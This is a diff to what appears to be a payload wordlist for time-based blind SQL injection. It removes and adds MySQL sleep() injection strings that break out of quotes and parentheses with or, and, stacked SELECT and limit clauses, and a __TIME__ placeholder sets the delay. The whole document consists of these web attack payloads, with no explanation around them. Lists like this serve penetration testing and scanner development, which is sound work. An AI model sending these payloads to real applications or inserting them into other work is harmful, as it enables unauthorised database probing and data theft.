@@ -1,32 +1,9 @@
-[space]sleep(__TIME__)#
-[space]or sleep(__TIME__)#
-" or sleep(__TIME__)#
-' or sleep(__TIME__)#
-" or sleep(__TIME__)="
-' or sleep(__TIME__)='
-) or sleep(__TIME__)#
-") or sleep(__TIME__)="
-') or sleep(__TIME__)='
-)) or sleep(__TIME__)#
-")) or sleep(__TIME__)="
-')) or sleep(__TIME__)='
-[space]and sleep(__TIME__)#
-" and sleep(__TIME__)#
-' and sleep(__TIME__)#
-" and sleep(__TIME__)="
+[space]and sleep(__TIME__)
+[space]or (sleep(__TIME__)+1) limit 1 #[space]
 ' and sleep(__TIME__)='
-) and sleep(__TIME__)#
-") and sleep(__TIME__)="
-') and sleep(__TIME__)='
-)) and sleep(__TIME__)#
-")) and sleep(__TIME__)="
-')) and sleep(__TIME__)='
-; SELECT sleep(__TIME__)#
-" ; SELECT sleep(__TIME__)#
-' ; SELECT sleep(__TIME__)#
-) ; SELECT sleep(__TIME__)#
-") ; SELECT sleep(__TIME__)#
-') ; SELECT sleep(__TIME__)#
-)) ; SELECT sleep(__TIME__)#
-")) ; SELECT sleep(__TIME__)#
-')) ; SELECT sleep(__TIME__)#
+' and (sleep(__TIME__)+1) limit 1 #[space]
+" and sleep(__TIME__)="
+' or (sleep(__TIME__)+1) limit 1 #[space]
+" or (sleep(__TIME__)+1) limit 1 #[space]
+'=sleep(__TIME__)='
+"=sleep(__TIME__)="
